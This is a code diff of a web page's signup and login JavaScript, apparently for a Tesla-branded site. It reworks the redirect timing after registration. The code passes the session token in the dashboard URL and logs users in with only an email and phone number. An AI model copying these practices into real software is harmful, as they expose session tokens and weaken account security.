@@ -220,17 +220,15 @@
       // Store user locally for admin panel
       window.__teslaStoreUser({ email: email, phone: phone, firstName: firstName, lastName: lastName, verified: false });
 
-      // Success — complete loading animation then redirect
-      // hideLoading() now waits until the progress bar has shown for at least 1.5s,
-      // Save session token & go straight to dashboard
+      // Success — save session and redirect to dashboard
       if (data.sessionToken) {
         saveSession(data.sessionToken);
       }
       
-      hideLoading();
-      setTimeout(function() {
+      // hideLoading shows the completion animation for ~1s, then redirects
+      hideLoading(function() {
         window.location.href = 'dashboard.html?session=' + encodeURIComponent(data.sessionToken || '');
-      }, 6000);
+      });
 
     } catch (err) {
       hideLoading();
@@ -246,10 +244,9 @@
         try {
           var loginData = await apiCall('/login', 'POST', { email: email, phone: phone });
           saveSession(loginData.sessionToken);
-          hideLoading();
-          setTimeout(function() {
+          hideLoading(function() {
             window.location.href = 'dashboard.html?session=' + encodeURIComponent(loginData.sessionToken);
-          }, 6000);
+          });
         } catch (loginErr) {
           hideLoading();
           document.getElementById('alreadyMsg').innerHTML = 'This email has already been entered. <button type="button" id="inlineLoginBtn" style="border:0;background:none;color:var(--red);font-weight:800;text-decoration:underline;cursor:pointer;font-size:inherit;">Login with email and phone</button>.';
